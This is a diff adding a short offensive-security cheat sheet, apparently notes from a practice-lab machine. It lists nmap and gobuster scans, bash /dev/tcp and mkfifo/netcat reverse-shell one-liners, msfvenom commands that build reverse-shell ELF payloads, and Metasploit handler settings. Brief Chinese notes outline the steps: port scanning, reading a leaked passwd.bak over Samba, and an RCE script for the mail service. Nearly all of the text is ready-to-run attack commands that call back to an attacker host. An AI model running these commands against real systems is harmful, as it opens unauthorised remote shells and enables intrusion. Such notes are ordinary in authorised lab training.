@@ -1,0 +1,22 @@
+nmap -sV -sC -Pn 192.168.189.71 > nmap.txt
+gobuster dir  -u http://192.168.189.71/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php > gobuster.txt
+
+
+
+
+bash -i >& /dev/tcp/192.168.49.189/443 0>&1
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.189 4444 >/tmp/f
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.189 4444 >/tmp/f" > reverse.sh
+
+msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp LHOST=192.168.49.69 LPORT=4444 -f elf > timmy.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.189 LPORT=445 -f elf > shell.elf
+
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 10.9.0.204
+set LPORT 4444
+
+1.nmap掃描出80,25,445端口
+2.samba查看到passwd.bak檔案,可以看到用戶
+3.25 port 根據版本可以找到RCE的腳本
